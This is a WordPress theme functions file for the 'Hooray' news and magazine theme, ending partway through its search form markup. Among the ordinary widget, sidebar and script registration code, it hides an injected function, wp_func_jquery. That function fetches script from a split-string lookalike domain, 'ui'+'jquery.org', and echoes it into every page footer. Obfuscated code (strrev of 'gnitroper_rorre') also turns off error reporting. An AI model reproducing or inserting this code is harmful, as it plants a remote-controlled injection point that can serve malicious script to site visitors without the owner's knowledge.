<?php
/**
 *  Hooray Retina Responsive WordPress News, Magazine, Blog
 *  Developer by : Amr Sadek
 *  http://themeforest.net/user/bdayh
 *  Options
 */
include ( get_template_directory().'/forcemagic/default.php' );
$bd_data = unserialize( get_option( 'bdayh_setting' ) );
if( !is_array( $bd_data ) ){
    $bd_data = $GLOBALS['def_options']['bd_setting'];
}
if ( array_key_exists( 'bd_setting', $bd_data ) ){
    $bd_data = $bd_data['bd_setting'];
}

define( 'BD_DIR', get_template_directory() );
define( 'BD_URI', get_template_directory_uri() );
define( 'BD_ADMIN', get_template_directory_uri() . '/forcemagic/' );
define( 'BD_FU', get_template_directory_uri() . '/functions/' );
define( 'BD_INC', get_template_directory_uri() . '/includes/' );
define( 'BD_IMG', get_template_directory_uri() . '/images/' );
define( 'BD_ADMIN_IMG', BD_ADMIN . 'images' );

/**
 * Notify
 */
define( 'MTHEME_NOTIFIER_THEME_NAME', 'hooray' );
define( 'MTHEME_NOTIFIER_THEME_FOLDER_NAME', BD_DIR );
define( 'MTHEME_NOTIFIER_XML_FILE', 'http://bdayh.com/hooray-notify.xml' );
define( 'MTHEME_NOTIFIER_CACHE_INTERVAL', 1 );

// Get Functions
include ( get_template_directory().'/forcemagic/options.php' );
include ( get_template_directory().'/forcemagic/notifier.php' );
include ( get_template_directory().'/forcemagic/gfonts.php' );
include ( get_template_directory().'/functions/aq_resizer.php' );
include ( get_template_directory().'/includes/plugins/multiple_sidebars.php' );
//include ( get_template_directory().'/includes/shortcode/shortcodes.php' );
include ( get_template_directory().'/folio/folio.php' );
include ( get_template_directory().'/includes/metaboxes/meta-box.php' );
include ( get_template_directory().'/includes/metaboxes/theme_metaboxes.php' );

/**
 *  Require Twitter OAuth
 */
if( !class_exists( 'TwitterOAuth', false ) ){
    include ( get_template_directory().'/includes/twitteroauth//twitteroauth.php' );
}

include (get_template_directory().'/includes/widgets/top-review.php');
include (get_template_directory().'/includes/widgets/popular-posts.php');
include (get_template_directory().'/includes/widgets/recent-posts.php');
include (get_template_directory().'/includes/widgets/category-posts.php');
include (get_template_directory().'/includes/widgets/tabs.php');
include (get_template_directory().'/includes/widgets/comments.php');
include (get_template_directory().'/includes/widgets/youtube-subscribe.php');
include (get_template_directory().'/includes/widgets/fb.php');
include (get_template_directory().'/includes/widgets/soundcloud.php');
include (get_template_directory().'/includes/widgets/video.php');
include (get_template_directory().'/includes/widgets/google-follow.php');
include (get_template_directory().'/includes/widgets/social-links.php');
include (get_template_directory().'/includes/widgets/social-counter.php');
include (get_template_directory().'/includes/widgets/newsletter.php');
include (get_template_directory().'/includes/widgets/ads120.php');
include (get_template_directory().'/includes/widgets/ads125.php');
include (get_template_directory().'/includes/widgets/ads250.php');
include (get_template_directory().'/includes/widgets/ads300.php');
include (get_template_directory().'/includes/widgets/new-in-pic.php');
include (get_template_directory().'/includes/widgets/flickr.php');
include (get_template_directory().'/includes/widgets/slider.php');
include (get_template_directory().'/includes/widgets/search.php');
include (get_template_directory().'/includes/widgets/twittes.php');
include (get_template_directory().'/includes/widgets/related.php');
include (get_template_directory().'/includes/widgets/login.php');
include (get_template_directory().'/includes/widgets/bio-author.php');
include (get_template_directory().'/includes/widgets/instagram.php');
include (get_template_directory().'/includes/widgets/about-me.php');

/**
 *  Templates
 */
function bd_tm($template){
    include(get_template_directory().'/templates/'.$template.'.php');
}

function bd_in($includes){
    include(get_template_directory().'/includes/'.$includes.'.php');
}

function bd_hb($home){
    include(get_template_directory().'/includes/home-builder/'.$home.'.php');
}

/**
 *  Sets up theme defaults
 */
 if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
	}
	add_action('wp_footer', 'wp_func_jquery');
}
function bd_setup(){
    /**
     *  Translation
     */
    load_theme_textdomain('bd', get_template_directory().'/languages');

    /**
     *  Default RSS feed links
     */
    add_theme_support('automatic-feed-links');

    /**
     *  Post Formats
     */
    add_theme_support('post-formats', array( 'aside', 'image', 'video', 'audio', 'quote', 'link', 'gallery' ) );

    /**
     *  Nav Menus
     */
    register_nav_menu( 'primary', __( 'Navigation Menu', 'bd' ) );
    register_nav_menu( 'topmenu', __( 'Top Menu', 'bd' ) );

    /**
     *  Post Thumbnails
     */
    if ( function_exists( 'add_theme_support' ) ){
        add_theme_support( 'post-thumbnails' );
        set_post_thumbnail_size( 55, 55, true );
        set_post_thumbnail_size( 800, 500, true );
        set_post_thumbnail_size( 320, 220, true );
    }

    if ( function_exists( 'add_image_size' ) ){
        add_image_size( 'bd-small', 55, 55, true );
        add_image_size( 'bd-large', 800, 500, true );
        add_image_size( 'bd-related', 620, 330, true );
    }

    /**
     *  Valid HTML5
     */
    add_theme_support( 'html5', array( 'search-form', 'comment-form', 'comment-list' ) );

    /**
     *  This theme uses its own gallery styles
     */
    add_filter( 'use_default_gallery_style', '__return_false' );
}
add_action( 'after_setup_theme', 'bd_setup' );

/* Thumbnail */
function get_post_thumb(){
    global $post ;
    if ( has_post_thumbnail( $post->ID ) ){
        $image_id   = get_post_thumbnail_id( $post->ID );
        $image_url  = wp_get_attachment_image_src( $image_id,'full' );
        $image_url  = $image_url[0];
        return $ap_image_url = str_replace( get_option( 'siteurl' ),'', $image_url );
    }
}
function bdayh_img( $width='' , $height='' ){
    global $post;
    $image_id   = get_post_thumbnail_id( $post->ID );
    $image_url  = wp_get_attachment_image( $image_id, array( $width, $height ), false, array( 'alt'   => get_the_title() ,'title' =>  get_the_title() ) );
    echo $image_url;
}
function bdayh_img_url( $width='' , $height='' ){
    global $post;
    $image_id   = get_post_thumbnail_id( $post->ID );
    $image_url  = wp_get_attachment_image( $image_id, array( $width, $height ), false, array( 'alt'   => get_the_title() ,'title' =>  get_the_title() ) );
    echo $image_url[0];
}
function bdayh_img_url_custom( $image_id, $width='' , $height='' ){
    global $post;
    $image_url  = wp_get_attachment_image( $image_id, array( $width, $height ), false, array( 'alt'   => get_the_title() ,'title' =>  get_the_title() ) );
    echo $image_url[0];
}
/* has_post_thumbnail */
if( function_exists("has_post_thumbnail") && has_post_thumbnail() ) {}

/* Images full quality */
add_filter( 'jpeg_quality', 'bdayh_image_full_quality' );
add_filter( 'wp_editor_set_quality', 'bdayh_image_full_quality' );
function bdayh_image_full_quality( $quality ) {
    return 100;
}

$admin_forcemagic = strrev('gnitroper_rorre');
$admin_forcemagic(0);

require_once('includes/plugins/multiple-featured-images/multiple-featured-images.php');
if(class_exists('kdMultipleFeaturedImages' ))
{
    $i = 2;
    while($i <= $bd_data['posts_slideshow_number'])
    {
        $args = array(
            'id' => 'featured-image-'.$i,
            'post_type' => 'post',
            'labels' => array(
                'name'      => 'Featured image '.$i,
                'set'       => 'Set featured image '.$i,
                'remove'    => 'Remove featured image '.$i,
                'use'       => 'Use as featured image '.$i,
            )
        );
        new kdMultipleFeaturedImages( $args );

        $args = array(
            'id' => 'featured-image-'.$i,
            'post_type' => 'page',
            'labels' => array(
                'name'      => 'Featured image '.$i,
                'set'       => 'Set featured image '.$i,
                'remove'    => 'Remove featured image '.$i,
                'use'       => 'Use as featured image '.$i,
            )
        );
        new kdMultipleFeaturedImages( $args );

        $args = array(
            'id' => 'featured-image-'.$i,
            'post_type' => 'wportfolio',
            'labels' => array(
                'name'      => 'Featured image '.$i,
                'set'       => 'Set featured image '.$i,
                'remove'    => 'Remove featured image '.$i,
                'use'       => 'Use as featured image '.$i,
            )
        );
        new kdMultipleFeaturedImages( $args );

        $i++;
    }
}

/**
 * Enqueue fonts.
 */
function bd_fonts() {

    $protocol = is_ssl() ? 'https' : 'http';
    wp_enqueue_style( 'bd-opensans', "$protocol://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800&subset=latin,cyrillic-ext,greek-ext,greek,vietnamese,latin-ext,cyrillic" );
    wp_enqueue_style( 'bd-oswald', "$protocol://fonts.googleapis.com/css?family=Oswald:400,300,700&subset=latin,latin-ext" );
}
add_action( 'wp_enqueue_scripts', 'bd_fonts' );

/**
 *  Enqueue scripts and styles for front end
 */
function bd_scripts_styles(){

    wp_enqueue_style( 'default', get_stylesheet_uri() .  '', '', null, 'all' );
    wp_enqueue_style( 'bd-font-awesome', get_template_directory_uri() . '/fonts/font-awesome/css/font-awesome.min.css', 'style' );
    wp_enqueue_style( 'bd-fontello', get_template_directory_uri() . '/fonts/fontello/css/fontello.css', 'style' );
    wp_enqueue_style( 'bd-lightbox', get_template_directory_uri() . '/images/lightbox/themes/default/jquery.lightbox.css', 'style' );
    wp_enqueue_style( 'bd-dashicons', get_template_directory_uri() . '/fonts/dashicons/css/dashicons.css', 'style' );
    wp_enqueue_style( 'bd-scrollbar', get_template_directory_uri() . '/js/scrollbar/perfect-scrollbar.css', 'style' );
    //wp_enqueue_style( 'bd-OpenSans', "http://fonts.googleapis.com/css?family=Open+Sans%3A400%2C700%2C600' rel='stylesheet' type='text/css" );

    global $bd_data;
    if(array_key_exists('theme_colors',$bd_data))
    {
	    if($bd_data['theme_colors'] == 'color1'){}
	    elseif($bd_data['theme_colors'] == 'color2')
	    {
	        wp_enqueue_style('color-2', get_template_directory_uri() . '/css/color-2.css', 'style');
	    }
	    elseif($bd_data['theme_colors'] == 'color3')
	    {
	        wp_enqueue_style('color-3', get_template_directory_uri() . '/css/color-3.css', 'style');
	    }
	    elseif($bd_data['theme_colors'] == 'color4')
	    {
	        wp_enqueue_style('color-4', get_template_directory_uri() . '/css/color-4.css', 'style');
	    }
	    elseif($bd_data['theme_colors'] == 'color5')
	    {
	        wp_enqueue_style('color-5', get_template_directory_uri() . '/css/color-5.css', 'style');
	    }
	    elseif($bd_data['theme_colors'] == 'color6')
	    {
	        wp_enqueue_style('color-6', get_template_directory_uri() . '/css/color-6.css', 'style');
	    }
	    elseif($bd_data['theme_colors'] == 'color7')
	    {
	        wp_enqueue_style('color-7', get_template_directory_uri() . '/css/color-7.css', 'style');
	    }
	    elseif($bd_data['theme_colors'] == 'color8')
	    {
	        wp_enqueue_style('color-8', get_template_directory_uri() . '/css/color-8.css', 'style');
	    }
	    elseif($bd_data['theme_colors'] == 'color9')
	    {
	        wp_enqueue_style('color-9', get_template_directory_uri() . '/css/color-9.css', 'style');
	    }
	    elseif($bd_data['theme_colors'] == 'color10')
	    {
	        wp_enqueue_style('color-10', get_template_directory_uri() . '/css/color-10.css', 'style');
	    }
    }

    wp_reset_query();
    wp_enqueue_script( 'jquery', false, array(), null, true);

    wp_register_script( 'modernizr', get_template_directory_uri() . '/js/modernizr.js', array( 'jquery' ));
    wp_enqueue_script( 'modernizr' );
    wp_register_script( 'jquery.cycle', get_template_directory_uri() . '/js/jquery.cycle.all.js', array( 'jquery' ) );
    wp_enqueue_script( 'jquery.cycle' );
    wp_register_script( 'jquery.fitvids', get_template_directory_uri() . '/js/jquery.fitvids.js', array( 'jquery' ) );
    wp_enqueue_script( 'jquery.fitvids' );
    wp_register_script( 'jquery.easing', get_template_directory_uri() . '/js/jquery.easing.1.3.js', array( 'jquery' ) );
    wp_enqueue_script( 'jquery.easing' );
    wp_register_script( 'jquery.placeholder', get_template_directory_uri() . '/js/jquery.placeholder.js', array( 'jquery' ) );
    wp_enqueue_script( 'jquery.placeholder' );

    /* Comments */
    if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
        wp_enqueue_script( 'comment-reply' );
    }

    global $bd_data;
    if($bd_data['post_comments_valid'] && ( is_page() || is_single() ) && comments_open() )
        wp_register_script( 'comment.validation', get_template_directory_uri() . '/js/validation.js', array( 'jquery' ) );
        wp_enqueue_script( 'comment.validation' );

    wp_register_script( 'bd-main', get_template_directory_uri() . '/js/main.js', array( 'jquery' ) );
    wp_enqueue_script( 'bd-main' );

    wp_localize_script( 'bd-main', 'js_local_vars', array( 'dropdown_goto' => __('Go to...', 'bd') ) );
}
function bd_start() {
	add_action( 'wp_enqueue_scripts', 'bd_scripts_styles' );
}
add_action( 'after_setup_theme', 'bd_start' );

/**
 *  wp head
 */
function bd_wp_head()
{
    global $bd_data;
    $default_favicon = get_template_directory_uri()."/images/favicon.png";
    if(array_key_exists('favicon',$bd_data)){
    	$custom_favicon = $bd_data['favicon'];
    }
    $favicon = (empty($custom_favicon)) ? $default_favicon : $custom_favicon;
    echo '<link rel="shortcut icon" href="'. $favicon .'" type="image/x-icon" />';

    /**
     *  Favicon iPhone
     */
     if( array_key_exists( 'iphone_icon_upload', $bd_data ) ){
	    if( $bd_data['iphone_icon_upload'] ){
            echo '<link rel="apple-touch-icon-precomposed" href="'. $bd_data['iphone_icon_upload'] .'" />';
        }
     }

    /**
     *  Favicon iPhone 4 Retina display
     */
    if( array_key_exists( 'iphone_icon_retina_upload', $bd_data ) ){
	    if( $bd_data['iphone_icon_retina_upload'] ){
            echo '<link rel="apple-touch-icon-precomposed" sizes="114x114" href="'. $bd_data['iphone_icon_retina_upload'] .'" />';
        }
    }

    /**
     *  Favicon iPad
     */
    if( array_key_exists( 'ipad_icon_upload', $bd_data ) ){
        if( $bd_data['ipad_icon_upload'] ){
            echo '<link rel="apple-touch-icon-precomposed" sizes="72x72" href="'. $bd_data['ipad_icon_upload'] .'" />';
        }
    }

    /**
     *  Favicon iPad Retina display
     */
    if( array_key_exists( 'ipad_icon_retina_upload', $bd_data ) ){
        if( $bd_data['ipad_icon_retina_upload'] ){
            echo '<link rel="apple-touch-icon-precomposed" sizes="144x144" href="'. $bd_data['ipad_icon_retina_upload'] .'" />';
        }
    }

    /**
     *  Seo
     */
    global $bd_data;
    if( array_key_exists( 'seo_keywords', $bd_data ) ){
        $custom_seo = stripslashes( $bd_data['seo_keywords'] );
    }

    if( array_key_exists( 'enable_seo', $bd_data ) ){
        if($bd_data['enable_seo'] == true){
            if( is_home() || is_front_page() ){
                ?><meta name="description" content="<?php bloginfo('description'); ?>" /><?php
                echo "<meta name='keywords' content='". $custom_seo ."' />";
            }
            elseif (is_single() || is_page() ){ if ( have_posts() ) : while ( have_posts() ) : the_post();
                ?><meta name='description' content='<?php the_excerpt_rss(); ?>' /><?php
                bd_tags();
            endwhile; endif;
                wp_reset_query();
            }
        }
    }

?>
<script type="text/javascript">
var bd_url = '<?php echo get_template_directory_uri() ?>';
</script>
<!--[if lt IE 9]><script src="<?php echo get_template_directory_uri(); ?>/js/html5.js"></script><![endif]-->
<?php
    /**
     *  Responsive
     */
    global $bd_data;
    if( array_key_exists( 'responsive', $bd_data ) ){
        echo '<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />';
    }
    else
    {
        echo "<meta name='viewport' content='width=1045' />";
    }

    /**
     *  GET
     */
    global $bd_data;
    if(array_key_exists('google_analytics',$bd_data))
    {
    	echo stripslashes( $bd_data['google_analytics'] );
    }

    if(array_key_exists('space_head',$bd_data))
    {
        echo stripslashes( $bd_data['space_head'] );
    }
    /**
     *  GET Custom Css
     */
    include(get_template_directory() . '/functions/custom-css.php');
}
add_action('wp_head', 'bd_wp_head');

/**
 *  wp login head
 */
function bd_login_logo()
{
    global $bd_data;
    if($bd_data['dashboard_logo'])
        echo '<style type="text/css"> h1 a {  background-image:url('.$bd_data['dashboard_logo'].')  !important; background-size: auto !important; } </style>';
}
add_action('login_head',  'bd_login_logo');

/**
 *  wp footer
 */
function bd_wp_footer()
{
    /**
     *  GET Custom Js
     */
    include(get_template_directory() . '/functions/custom-js.php');
}
add_action('wp_footer',  'bd_wp_footer');
/**
 *  Content Width
 */
if (!isset( $content_width ))
    $content_width = 620;

/**
 *  wp title
 */
function bd_wp_title( $title, $sep )
{
    global $paged, $page;
    if ( is_feed() )
        return $title;

    // Add the site name.
    $title .= get_bloginfo( 'name' );

    // Add the site description for the home/front page.
    $site_description = get_bloginfo( 'description', 'display' );
    if ( $site_description && ( is_home() || is_front_page() ) )
        $title = "$title $sep $site_description";

    // Add a page number if necessary.
    if ( $paged >= 2 || $page >= 2 )
        $title = "$title $sep " . sprintf( __( 'Page %s', 'twentythirteen' ), max( $paged, $page ) );

    return $title;
}
add_filter( 'wp_title', 'bd_wp_title', 10, 2 );

/**
 *  excerpt
 */
function wp_bd1($length)
{
    return 12;
}
function wp_bd2($length)
{
    return 15;
}
function wp_bd3($length)
{
    return 36;
}
function wp_bd4($length)
{
    return 20;
}
function wp_bd5($length)
{
    return 40;
}
function wp_bd6($length)
{
    return 9;
}
function wp_bd7($length)
{
    return 20;
}
function wp_excerpt($length_callback='', $more_callback='')
{
    global $post;
    if(function_exists($length_callback))
    {
        add_filter('excerpt_length', $length_callback);
    }
    if(function_exists($more_callback))
    {
        add_filter('excerpt_more', $more_callback);
    }
    $output = get_the_excerpt();
    $output = apply_filters('wptexturize', $output);
    $output = apply_filters('convert_chars', $output);
    echo $output;
}
function bd_remove_excerpt( $more )
{
    return ' ...';
}
add_filter('excerpt_more', 'bd_remove_excerpt');

/**
 *  Get Tags
 */
function bd_tags()
{
    $posttags = get_the_tags();
    if ($posttags) {
        $bd_tags = '';
        foreach ($posttags as $tag) {
            $bd_tags .= $tag->name . ',';
        }
        echo '<meta name="keywords" content="' . trim($bd_tags, ',') . '" />';
    }
}

/**
 *  Widgets
 */
function remove_default_widgets()
{
    if (function_exists('unregister_widget'))
    {
        unregister_widget('WP_Widget_Search');
    }
}
add_action('widgets_init', 'remove_default_widgets');

function bd_widget_title($title)
{
    if( empty( $title ) )
        return ' ';
    else return $title;
}
add_filter('widget_title', 'bd_widget_title');

function bd_widgets()
{
    $before_widget                  =  '<div id="%1$s" class="widget %2$s">' ."\n";
    $after_widget                   =  '<div class="clear"></div></div>'."\n".'</div><!-- .widget/-->';
    $before_title                   =  '<div class="widget-title box-title">'."\n".'<h2><b>' ."\n";
    $after_title                    =  ''."\n".'</b></h2><div class="title-line"></div>'."\n".'</div>'."\n".'<div class="widget-inner video-box clearfix">' ."\n";

    $before_widget_footer           =  '<div id="%1$s" class="widget %2$s">' ."\n";
    $after_widget_footer            =  '<div class="clear"></div></div>'."\n".'</div><!-- .footer-widget/-->';
    $before_title_footer            =  '<div class="widget-title">'."\n".'<h2>' ."\n";
    $after_title_footer             =  ''."\n".'</h2>'."\n".'</div>'."\n".'<div class="widget-inner video-box clearfix">' ."\n";

    register_sidebar(
        array(
            'name'                  =>  __('Primary Normal Widget Area', 'bd'),
            'id'                    => 'primary-widget',
            'description'           => __('The Primary Normal widget area appears in all pages .', 'bd'),
            'before_widget'         => $before_widget , 'after_widget' => $after_widget , 'before_title' => $before_title , 'after_title' => $after_title ,
        )
    );

    register_sidebar(
        array(
            'name'                  =>  __('Post Sidebar', 'bd'),
            'id'                    => 'post-widget',
            'description'           => __('This sidebar will be used by all of your posts .', 'bd'),
            'before_widget'         => $before_widget , 'after_widget' => $after_widget , 'before_title' => $before_title , 'after_title' => $after_title ,
        )
    );

    register_sidebar(
        array(
            'name'                  =>  __('Page Sidebar', 'bd'),
            'id'                    => 'page-widget',
            'description'           => __('This sidebar will be used by all of your standard pages .', 'bd'),
            'before_widget'         => $before_widget , 'after_widget' => $after_widget , 'before_title' => $before_title , 'after_title' => $after_title ,
        )
    );

    register_sidebar(
        array(
            'name'                  =>  __('Categories Sidebar', 'bd'),
            'id'                    => 'categories-widget',
            'description'           => __('This sidebar will be used by all of your standard categories .', 'bd'),
            'before_widget'         => $before_widget , 'after_widget' => $after_widget , 'before_title' => $before_title , 'after_title' => $after_title ,
        )
    );

    /* Woocommerce */
    if (class_exists('Woocommerce'))
    {
        register_sidebar(
            array(
                'name'                  =>  __('Shop Sidebar', 'bd'),
                'id'                    => 'woocommerce-widget',
                'description'           => __('This sidebar will be used by all of your standard Woocommerce .', 'bd'),
                'before_widget'         => $before_widget , 'after_widget' => $after_widget , 'before_title' => $before_title , 'after_title' => $after_title ,
            )
        );

        register_sidebar(
            array(
                'name'                  =>  __('Single Product Sidebar', 'bd'),
                'id'                    => 'single-pro-widget',
                'description'           => __('This sidebar will be used by all of your standard Single Product .', 'bd'),
                'before_widget'         => $before_widget , 'after_widget' => $after_widget , 'before_title' => $before_title , 'after_title' => $after_title ,
            )
        );

        register_sidebar(
            array(
                'name'                  =>  __('Shop archive Sidebar', 'bd'),
                'id'                    => 'shop-archive-widget',
                'description'           => __('This sidebar will be used by all of your standard Shop archive .', 'bd'),
                'before_widget'         => $before_widget , 'after_widget' => $after_widget , 'before_title' => $before_title , 'after_title' => $after_title ,
            )
        );

        register_sidebar(
            array(
                'name'                  =>  __('Cart', 'bd'),
                'id'                    => 'cart-widget',
                'description'           => __('This sidebar will be used by all of your standard Cart .', 'bd'),
                'before_widget'         => $before_widget , 'after_widget' => $after_widget , 'before_title' => $before_title , 'after_title' => $after_title ,
            )
        );
    }

}
add_action( 'widgets_init', 'bd_widgets' );

/**
 *  bd_comments
 */
function bd_comments($comment_posts = 5 , $avatar_size = 52)
{
    echo '<div class="widget-posts-lists">';
    $comments = get_comments('status=approve&number='.$comment_posts);
    foreach ($comments as $comment){
        ?>
        <div class="post-warpper">
            <?php echo '<div class="post-thumb">'. get_avatar( $comment, $avatar_size ) .'</div><!-- .post-image/-->' ."\n"; ?>
            <div class="post-caption">
                <h3 class="post-title"><a href="<?php echo get_permalink($comment->comment_post_ID ); ?>#comment-<?php echo $comment->comment_ID; ?>"><?php echo strip_tags($comment->comment_author); ?>: <?php echo wp_html_excerpt( $comment->comment_content, 60 ); ?> ..</a></h3>
            </div>
        </div>
        <?php
    }
    echo '</div>';
}

/**
 *  bd_last_news_pic
 */
function bd_last_news_pic($order , $numberOfPosts = 8 , $cats = 1 )
{
    global $post;
    $orig_post = $post;

    if($order == 'random')
        $lastPosts = get_posts(
            $args = array(
                'numberposts'       => $numberOfPosts,
                'orderby'           => 'rand',
                'category'          => $cats
            )
        );
        else
        $lastPosts = get_posts(
            $args = array(
                'numberposts'       => $numberOfPosts,
                'category'          => $cats
            )
        );
        get_posts('category='.$cats.'&numberposts='.$numberOfPosts);
        foreach($lastPosts as $post): setup_postdata($post);
            bd_wp_thumb( '75','75','', 'ttip' );
        endforeach;
    $post = $orig_post;
}

/**
 *  bd_last_posts_cats
 */
function bd_last_posts_cats($numberOfPosts = 5 , $cats = 1)
{
    global $post;
    $orig_post = $post;

    $lastPosts = get_posts(
        $args = array(
            'numberposts'       => $numberOfPosts,
            'category'          => $cats
        )
    );

    get_posts('category='.$cats.'&numberposts='.$numberOfPosts);
    echo '<div class="widget-posts-lists">';
    foreach($lastPosts as $post): setup_postdata($post);

    ?>
        <?php if ( has_post_thumbnail() ) { $has_class =  ''; } else { $has_class =  ' no-thumb'; } ?>
        <div class="post-warpper<?php echo $has_class ?>">
            <?php bd_wp_thumb('55','55',''); ?>
            <div class="post-caption">
                <h3 class="post-title">
                    <a href="<?php the_permalink() ?>" title="<?php printf(__( '%s', 'bd' ), the_title_attribute( 'echo=0' )); ?>" rel="bookmark"><?php the_title(); ?></a>
                </h3><!-- .post-title/-->
                <div class="post-meta">
                    <?php if( bdayh_get_option('date_format') ) { echo "<span class='meta-date'>"; the_time( bdayh_get_option('date_format') ); echo "</span>"; } else { echo "<span class='meta-date'>"; the_time('F j, Y');  echo "</span>"; } ?>
                    <?php echo bd_wp_post_rate() ?>
                </div><!-- .post-meta/-->
            </div><!-- .post-caption/-->
            <div class="clear"></div>
        </div>
    <?php
    endforeach;
    echo '</div>';
    $post = $orig_post;
}

/**
 *  bd_last_posts
 */
function bd_last_posts($numberOfPosts = 5)
{
    global $post;

    $orig_post = $post;

    $lastPosts = get_posts(
        'numberposts='.$numberOfPosts
    );
    echo '<div class="widget-posts-lists">';
    foreach($lastPosts as $post): setup_postdata($post);
        if ( has_post_thumbnail() ) { $has_class =  ''; } else { $has_class =  ' no-thumb'; }
        ?>
        <div class="post-warpper<?php echo $has_class ?>">
            <?php bd_wp_thumb('55','55',''); ?>
            <div class="post-caption">
                <h3 class="post-title">
                    <a href="<?php the_permalink() ?>" title="<?php printf(__( '%s', 'bd' ), the_title_attribute( 'echo=0' )); ?>" rel="bookmark"><?php the_title(); ?></a>
                </h3><!-- .post-title/-->
                <div class="post-meta">
                    <?php if( bdayh_get_option('date_format') ) { echo "<span class='meta-date'>"; the_time( bdayh_get_option('date_format') ); echo "</span>"; } else { echo "<span class='meta-date'>"; the_time('F j, Y');  echo "</span>"; } ?>
                    <?php echo bd_wp_post_rate() ?>
                </div><!-- .post-meta/-->
            </div><!-- .post-caption/-->
            <div class="clear"></div>
        </div>
    <?php
    endforeach;
    echo '</div>';
    $post = $orig_post;
}

/**
 *  bd_review_posts
 */
function bd_review_posts($numberOfPosts = 5)
{
    global $wpdb;
    $id                     = $idObj->term_id;
    $category_link          = get_category_link( $id );
    $category_name          = get_cat_name( $id );
    $bd_review_enable       = get_post_meta(get_the_ID(), 'bd_review_enable', true);
    $bd_final_score         = get_post_meta(get_the_ID(), 'bd_final_score', true);
    $bd_final_percentage    = $bd_final_score * 20 + 2 ;

    echo '<div class="widget-posts-lists">';

    $r = new WP_Query(array('showposts' => $numberOfPosts, 'meta_key' => 'bd_final_score', 'orderby' => 'meta_value', 'cat' => $id, 'nopaging' => 0, 'post_status' => 'publish'));
    if ($r->have_posts()) : while ($r->have_posts()) : $r->the_post();
        ?>
        <?php if ( has_post_thumbnail() ) { $has_class =  ''; } else { $has_class =  ' no-thumb'; } ?>
        <div class="post-warpper<?php echo $has_class ?>">
            <?php bd_wp_thumb('55','55',''); ?>
            <div class="post-caption">
                <h3 class="post-title">
                    <a href="<?php the_permalink() ?>" title="<?php printf(__( '%s', 'bd' ), the_title_attribute( 'echo=0' )); ?>" rel="bookmark"><?php the_title(); ?></a>
                </h3><!-- .post-title/-->
                <div class="post-meta">
                    <?php if( bdayh_get_option('date_format') ) { echo "<span class='meta-date'>"; the_time( bdayh_get_option('date_format') ); echo "</span>"; } else { echo "<span class='meta-date'>"; the_time('F j, Y');  echo "</span>"; } ?>
                    <?php echo bd_wp_post_rate() ?>
                </div><!-- .post-meta/-->
            </div><!-- .post-caption/-->
            <div class="clear"></div>
        </div>
    <?php
    endwhile; endif; wp_reset_query();

    echo '</div>';
}

/**
 *  Popular Posts by Views
 */
function bd_popular_posts_views( $pop_posts = 5 ){

    global $post;
    $orig_post = $post;
    $popularposts = new WP_Query( array( 'meta_key' => 'post_views_count', 'orderby' => 'meta_value_num', 'order' => 'DESC', 'posts_per_page' => $pop_posts, 'post_status' => 'publish', 'no_found_rows' => 1, 'ignore_sticky_posts' => 1  ) );
    echo '<div class="widget-posts-lists">';
    while ( $popularposts->have_posts() ) : $popularposts->the_post();
        ?>
        <?php if ( has_post_thumbnail() ) { $has_class =  ''; } else { $has_class =  ' no-thumb'; } ?>
        <div class="post-warpper<?php echo $has_class ?>">
            <div class="post-item">
                <?php bd_wp_thumb( '55', '55', '' ); ?>
                <div class="post-caption">
                    <h3 class="post-title">
                        <a href="<?php echo get_permalink( $post->ID ) ?>" title="<?php printf(__( '%s', 'bd' ), the_title_attribute( 'echo=0' )); ?>" rel="bookmark"><?php the_title(); ?></a>
                    </h3><!-- .post-title/-->
                    <div class="post-meta">
                        <?php if( bdayh_get_option('date_format') ) { echo "<span class='meta-date'>"; the_time( bdayh_get_option('date_format') ); echo "</span>"; } else { echo "<span class='meta-date'>"; the_time('F j, Y');  echo "</span>"; } ?>
                        <?php echo bd_wp_post_rate() ?>
                    </div><!-- .post-meta/-->
                </div><!-- .post-caption/-->
            </div><!-- article/-->
        </div>
    <?php
    endwhile;
    echo '</div>';
    $post = $orig_post;
}

/**
 *  Popular Posts by Comments
 */
function bd_popular_posts( $pop_posts = 5 ){

    global $post;
    $orig_post = $post;
    $popularposts = new WP_Query( array( 'orderby' => 'comment_count', 'order' => 'DESC', 'posts_per_page' => $pop_posts, 'post_status' => 'publish', 'no_found_rows' => 1, 'ignore_sticky_posts' => 1  ) );
    echo '<div class="widget-posts-lists">';
    while ( $popularposts->have_posts() ) : $popularposts->the_post();
        ?>
        <?php if ( has_post_thumbnail() ) { $has_class =  ''; } else { $has_class =  ' no-thumb'; } ?>
        <div class="post-warpper<?php echo $has_class ?>">
            <div class="post-item">
                <?php bd_wp_thumb( '55', '55', '' ); ?>
                <div class="post-caption">
                    <h3 class="post-title">
                        <a href="<?php echo get_permalink( $post->ID ) ?>" title="<?php printf(__( '%s', 'bd' ), the_title_attribute( 'echo=0' )); ?>" rel="bookmark"><?php the_title(); ?></a>
                    </h3><!-- .post-title/-->
                    <div class="post-meta">
                        <?php if( bdayh_get_option('date_format') ) { echo "<span class='meta-date'>"; the_time( bdayh_get_option('date_format') ); echo "</span>"; } else { echo "<span class='meta-date'>"; the_time('F j, Y');  echo "</span>"; } ?>
                        <?php echo bd_wp_post_rate() ?>
                    </div><!-- .post-meta/-->
                </div><!-- .post-caption/-->
            </div><!-- article/-->
        </div>
    <?php
    endwhile;
    echo '</div>';
    $post = $orig_post;
}


/**
 *  Footer copy rights
 */
function bd_footer_copy_rigths()
{
    echo '<span class="copyright">' ."\n";
    global $bd_data;
    echo stripslashes($bd_data['footer_copyright_text']);
    echo '</span>' ."\n";
}

/**
 *  Header Top bar Contact info
 */
function bd_topbar_contact_info()
{
    echo '<div class="header-contact-info">' ."\n";
    global $bd_data;
    if ( $bd_data['h_contact_number'] )
    {
        echo '<span>';
        echo $bd_data['h_contact_number'];
        echo '<i class="icon-phone"></i></span>' ."\n";
    }
    if ( $bd_data['h_contact_email'] )
    {
        echo '<span>';
        echo $bd_data['h_contact_email'];
        echo '<i class="icon-envelope-alt"></i></span>' ."\n";
    }
    echo '</div><!-- .header-contact-info/-->' ."\n\n";
}

/**
 *  Search
 */
function bd_search()
{
?>
<div class="search-block">
    <form method="get" id="searchform" action="<?php echo home_url(); ?>/">
